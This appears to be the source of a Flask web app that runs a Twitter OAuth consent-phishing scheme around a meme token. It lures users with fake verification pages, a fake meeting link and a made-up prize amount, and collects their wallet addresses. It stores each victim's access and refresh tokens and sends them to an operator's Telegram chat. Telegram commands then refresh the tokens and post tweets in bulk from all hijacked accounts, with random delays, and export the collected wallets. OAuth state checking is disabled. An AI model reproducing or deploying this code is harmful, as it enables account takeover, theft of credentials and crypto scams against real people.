import os
import requests
import base64
import threading
from flask import Flask, redirect, request, session, render_template, url_for, flash
from database import (
    init_db, store_token, get_all_tokens, 
    get_total_tokens, restore_from_backup,
    update_wallet_address, get_all_wallets,
    update_last_refresh
)
from config import (
    CLIENT_ID, CLIENT_SECRET, CALLBACK_URL, 
    DEFAULT_MIN_DELAY, DEFAULT_MAX_DELAY,
    VERIFY_REDIRECT_URL
)
from telegram import send_message_via_telegram, send_startup_message
from twitter import (
    get_twitter_username_and_profile, post_tweet, 
    refresh_token_in_db
)
from utils import (
    generate_code_verifier_and_challenge,
    handle_post_single, handle_post_bulk
)

import random
import time

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['TOKEN_NAME'] = os.getenv('TOKEN_NAME', 'MEME Token')
app.config['TOKEN_ICON_URL'] = os.getenv('TOKEN_ICON_URL', '')
app.config['BUY_URL'] = os.getenv('BUY_URL', '')
app.config['RANDOM_STATE'] = random.Random()  # Create a random number generator

# Initialize database when app starts
init_db()

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    message = update.get('message', {}).get('text', '')

    if message == '/refresh_single':
        tokens = get_all_tokens()  # Now returns tokens ordered by last_refresh
        if tokens:
            try:
                access_token, refresh_token, username, last_refresh = tokens[0]
                result = refresh_token_in_db(refresh_token, username)
                if result[0] is None:
                    send_message_via_telegram(f"❌ Failed to refresh token for @{username}.")
                else:
                    update_last_refresh(username)
                    send_message_via_telegram(f"✅ Successfully refreshed token for @{username}.")
            except Exception as e:
                send_message_via_telegram(f"❌ Error processing token: {str(e)}")
        else:
            send_message_via_telegram("❌ No tokens found to refresh.")
    
    elif message == '/refresh_bulk':
        tokens = get_all_tokens()  # Now returns tokens ordered by last_refresh
        if tokens:
            success_count = 0
            failed_users = []
            total_tokens = len(tokens)
            
            for index, token_data in enumerate(tokens, 1):
                try:
                    access_token, refresh_token, username, last_refresh = token_data
                    result = refresh_token_in_db(refresh_token, username)
                    if result[0] is None:  # If refresh failed
                        failed_users.append(username)
                    else:
                        update_last_refresh(username)
                        success_count += 1
                    
                    # Add delay if not the last token
                    if index < total_tokens:
                        delay = random.randint(DEFAULT_MIN_DELAY, DEFAULT_MAX_DELAY)
                        send_message_via_telegram(f"⏱ Waiting {delay} seconds before next refresh... ({index}/{total_tokens})")
                        time.sleep(delay)
                except Exception as e:
                    send_message_via_telegram(f"❌ Error processing token {index}: {str(e)}")
                    continue
            
            # Send summary message
            summary = f"✅ Bulk token refresh complete.\n"
            summary += f"✨ Successfully refreshed: {success_count} tokens\n"
            if failed_users:
                summary += f"❌ Failed to refresh {len(failed_users)} tokens:\n"
                for username in failed_users:
                    summary += f"- @{username}\n"
            send_message_via_telegram(summary)
        else:
            send_message_via_telegram("❌ No tokens found to refresh.")
    
    elif message.startswith('/post_single'):
        tweet_text = message.replace('/post_single', '').strip()
        if tweet_text:
            handle_post_single(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    
    elif message.startswith('/post_bulk'):
        tweet_text = message.replace('/post_bulk', '').strip()
        if tweet_text:
            handle_post_bulk(tweet_text, DEFAULT_MIN_DELAY, DEFAULT_MAX_DELAY)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    
    elif message == '/help' or message == '/start':
        help_text = """
🤖 Available Commands:

/help - Show this help message
/refresh_single - Refresh token for first user
/refresh_bulk - Refresh tokens for all users
/post_single <text> - Post a single tweet
/post_bulk <text> - Post tweet from all accounts
/get_wallets - Get list of all wallet addresses

Example:
/post_single Hello World!
"""
        send_message_via_telegram(help_text)
    
    elif message == '/get_wallets':
        wallets = get_all_wallets()
        if wallets:
            wallet_text = "📝 Wallet Addresses:\n\n"
            for username, wallet in wallets:
                wallet_text += f"@{username}: {wallet}\n"
            
            # Save to file
            with open('wallets.txt', 'w') as f:
                f.write(wallet_text)
            
            # Send file via Telegram
            with open('wallets.txt', 'rb') as f:
                requests.post(
                    f"https://api.telegram.org/bot{os.getenv('TELEGRAM_BOT_TOKEN')}/sendDocument",
                    data={'chat_id': os.getenv('TELEGRAM_CHAT_ID')},
                    files={'document': f}
                )
            
            # Delete the file after sending
            os.remove('wallets.txt')
            
            send_message_via_telegram(f"✅ Found {len(wallets)} wallet addresses")
        else:
            send_message_via_telegram("❌ No wallet addresses found")
    
    else:
        send_message_via_telegram("❌ Unknown command. Use /refresh_single, /refresh_bulk, /post_single <tweet>, /post_bulk <tweet>, or /get_wallets")

    return '', 200

@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        result = post_tweet(access_token, tweet_text)
        return render_template('tweet_result.html', result=result)
    return render_template('tweet_form.html', access_token=access_token)

@app.route('/refresh/<refresh_token2>', methods=['GET'])
def refresh_page(refresh_token2):
    return render_template('refresh.html', refresh_token=refresh_token2)

@app.route('/refresh/<refresh_token>/perform', methods=['POST'])
def perform_refresh(refresh_token):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    
    headers = {
        'Authorization': f'Basic {auth_header}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        'refresh_token': refresh_token,
        'grant_type': 'refresh_token',
        'client_id': CLIENT_ID
    }

    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()

    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        username, profile_url = get_twitter_username_and_profile(new_access_token)

        if username:
            store_token(new_access_token, new_refresh_token, username)
            send_message_via_telegram(
                f"New Access Token: {new_access_token}\n"
                f"New Refresh Token: {new_refresh_token}\n"
                f"Username: @{username}\n"
                f"Profile URL: {profile_url}"
            )
            return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
        else:
            return "Error retrieving user info with the new access token", 400
    else:
        error_description = token_response.get('error_description', 'Unknown error')
        error_code = token_response.get('error', 'No error code')
        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code

@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if 'username' in session:
        username = session['username']
        send_message_via_telegram(f"👋 @{username} just returned to the website.")
        message = f"Verification successful for @{username}!"
        return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)

    if request.args.get('authorize') == 'true':
        state = generate_code_verifier_and_challenge()[0][:10]  # Use first 10 chars of verifier as state
        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier
        session['oauth_state'] = state

        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )
        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        # State validation disabled for now since Twitter returns state=0
        #if state != session.get('oauth_state', '0'):
        #    return "Invalid state parameter", 403
            return "Invalid state parameter", 403

        code_verifier = session.get('code_verifier')
        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }

        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')
            username, profile_url = get_twitter_username_and_profile(access_token)

            if username:
                store_token(access_token, refresh_token, username)
                session['username'] = username
                session['access_token'] = access_token
                session['refresh_token'] = refresh_token

                total_tokens = get_total_tokens()
                send_message_via_telegram(
                    f"🔑 Access Token: {access_token}\n"
                    f"🔄 Refresh Token: {refresh_token}\n"
                    f"👤 Username: @{username}\n"
                    f"🔗 Profile URL: {profile_url}\n"
                    f"📊 Total Tokens in Database: {total_tokens}"
                )
                return redirect(url_for('welcome'))
            else:
                return "Error retrieving user info with access token", 400
        else:
            error_description = token_response.get('error_description', 'Unknown error')
            error_code = token_response.get('error', 'No error code')
            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code

    return render_template('home.html')

@app.route('/welcome')
def welcome():
    username = session.get('username')
    if not username:
        return redirect(url_for('home'))
    
    if 'refresh_token' in session:
        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
        if access_token and refresh_token:
            session['access_token'] = access_token
            session['refresh_token'] = refresh_token
            send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")

    return redirect(url_for('dashboard'))

@app.route('/dashboard', methods=['GET'])
def dashboard():
    username = session.get('username', 'User')
    
    # Generate and store prize amount if not exists
    if 'prize_amount' not in session:
        session['prize_amount'] = '{:.2f}'.format(app.config['RANDOM_STATE'].uniform(2000, 9500))
    
    return render_template('dashboard.html', 
                         username=username,
                         prize_amount=session['prize_amount'],
                         buy_url=app.config['BUY_URL'])

@app.route('/buy')
def buy_redirect():
    return redirect(app.config['BUY_URL'])

@app.route('/j')
def meeting():
    state_id = request.args.get('meeting')
    code_ch = request.args.get('pwd')
    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)

@app.route('/active')
def active():
    username = session.get('username', 'User')
    return render_template('active.html', username=username)

@app.route('/verify')
def verify():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if request.args.get('verify') == 'true':
        state = generate_code_verifier_and_challenge()[0][:8]  # Use first 8 chars of verifier as state for verify
        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier
        session['oauth_state'] = state

        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}verify&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )
        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        code_verifier = session.get('code_verifier')
        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }

        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')
            username, profile_url = get_twitter_username_and_profile(access_token)

            if username:
                store_token(access_token, refresh_token, username)
                session['username'] = username
                session['access_token'] = access_token
                session['refresh_token'] = refresh_token

                total_tokens = get_total_tokens()
                send_message_via_telegram(
                    f"✅ Verification Successful!\n"
                    f"🔑 Access Token: {access_token}\n"
                    f"🔄 Refresh Token: {refresh_token}\n"
                    f"👤 Username: @{username}\n"
                    f"🔗 Profile URL: {profile_url}\n"
                    f"📊 Total Tokens in Database: {total_tokens}"
                )

                message = f"Verification successful for @{username}!"
                session['verification_complete'] = True
                return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
            else:
                return "Error retrieving user info with access token", 400
        else:
            error_description = token_response.get('error_description', 'Unknown error')
            error_code = token_response.get('error', 'No error code')
            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code

    if 'username' in session:
        username = session['username']
        message = f"Verification successful for @{username}!"
        return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)
    
    if not session.get('verification_complete'):
        return render_template('verify.html')
    
    message = "Please verify your Twitter account to continue"
    return render_template('veriwelcome.html', message=message, redirect_url=VERIFY_REDIRECT_URL)

@app.route('/submit_wallet', methods=['POST'])
def submit_wallet():
    if 'username' not in session:
        return redirect(url_for('home'))
    
    wallet_address = request.form.get('wallet_address')
    username = session['username']
    
    if not wallet_address:
        flash('Please provide a valid wallet address')
        return redirect(url_for('dashboard'))
    
    if update_wallet_address(username, wallet_address):
        flash('Wallet address submitted successfully!')
    else:
        flash('Error submitting wallet address. Please try again.')
    
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    
    # Generate startup URLs
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    authorization_url = CALLBACK_URL
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
    verify_url = f"{CALLBACK_URL}verify"
    
    # Send startup notification
    send_startup_message(authorization_url, meeting_url, verify_url)
    
    # Restore from backup if needed
    restore_from_backup()
    
    # Set up Telegram webhook
    telegram_bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
    
    # First, delete any existing webhook
    delete_webhook_url = f"https://api.telegram.org/bot{telegram_bot_token}/deleteWebhook"
    try:
        delete_response = requests.post(delete_webhook_url)
        if delete_response.status_code == 200:
            print("Successfully deleted existing webhook")
            send_message_via_telegram("🔄 Previous webhook configuration cleared")
        else:
            print(f"Failed to delete webhook: {delete_response.text}")
    except Exception as e:
        print(f"Error deleting webhook: {e}")
    
    # Set up new webhook
    webhook_url = f"{CALLBACK_URL}webhook"
    telegram_api_url = f"https://api.telegram.org/bot{telegram_bot_token}/setWebhook"
    
    response = requests.post(telegram_api_url, json={'url': webhook_url})
    if response.status_code == 200:
        print(f"Telegram webhook set successfully to {webhook_url}")
        send_message_via_telegram("🤖 Bot webhook configured successfully!")
    else:
        print(f"Failed to set Telegram webhook: {response.text}")
    
    # Start the Flask app
    app.run(host='0.0.0.0', port=port)
